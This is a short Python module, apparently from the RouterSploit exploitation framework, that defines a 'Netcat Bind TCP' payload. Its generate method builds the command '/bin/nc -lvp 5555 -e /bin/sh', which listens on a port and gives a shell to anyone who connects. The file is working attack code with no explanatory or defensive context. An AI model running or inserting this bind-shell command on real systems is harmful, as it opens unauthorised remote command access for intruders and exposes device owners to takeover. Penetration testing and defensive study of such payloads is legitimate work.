from routersploit import (
    exploits,
    payloads,
    validators
)


class Exploit(payloads.Payload):
    __info__ = {
        'name': 'Netcat Bind TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = "generic"
    rport = exploits.Option(5555, 'Bind Port', validators=validators.integer)
    netcat_binary = exploits.Option('/bin/nc', 'Netcat binary')
    shell_binary = exploits.Option('/bin/sh', 'Shell')

    def generate(self):
        self.payload = "{} -lvp {} -e {}".format(self.netcat_binary,
                                                 self.rport,
                                                 self.shell_binary)

